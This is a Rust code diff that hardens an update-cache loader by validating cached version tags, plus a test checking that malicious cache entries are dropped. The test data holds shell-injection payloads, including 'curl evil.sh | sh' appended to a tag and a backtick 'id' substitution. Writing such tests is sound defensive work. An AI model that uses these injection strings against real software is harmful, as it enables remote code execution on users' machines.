@@ -56,8 +56,12 @@ pub fn load(path: &Path) -> Cache {
         let value = value.trim();
         match key.trim() {
             "last_check" => cache.last_check = value.parse().unwrap_or(0),
-            "latest" if !value.is_empty() => cache.latest = Some(value.to_string()),
-            "prompted" if !value.is_empty() => cache.prompted = Some(value.to_string()),
+            "latest" if crate::update::check::is_valid_tag(value) => {
+                cache.latest = Some(value.to_string())
+            }
+            "prompted" if crate::update::check::is_valid_tag(value) => {
+                cache.prompted = Some(value.to_string())
+            }
             _ => {}
         }
     }
@@ -167,6 +171,22 @@ mod tests {
             prompted: None,
         };
         assert!(!is_fresh(&cache, 1_000_001));
+    }
+
+    #[test]
+    fn a_cached_tag_carrying_shell_metacharacters_is_dropped() {
+        // The cache file is on disk and editable; it must not be a way around
+        // the validation applied to tags fetched from the network.
+        let dir = temp();
+        let path = dir.path().join("update.txt");
+        std::fs::write(
+            &path,
+            "latest=v1.0.0; curl evil.sh | sh\nprompted=v1.0.0`id`\n",
+        )
+        .unwrap();
+        let cache = load(&path);
+        assert_eq!(cache.latest, None);
+        assert_eq!(cache.prompted, None);
     }
 
     #[test]
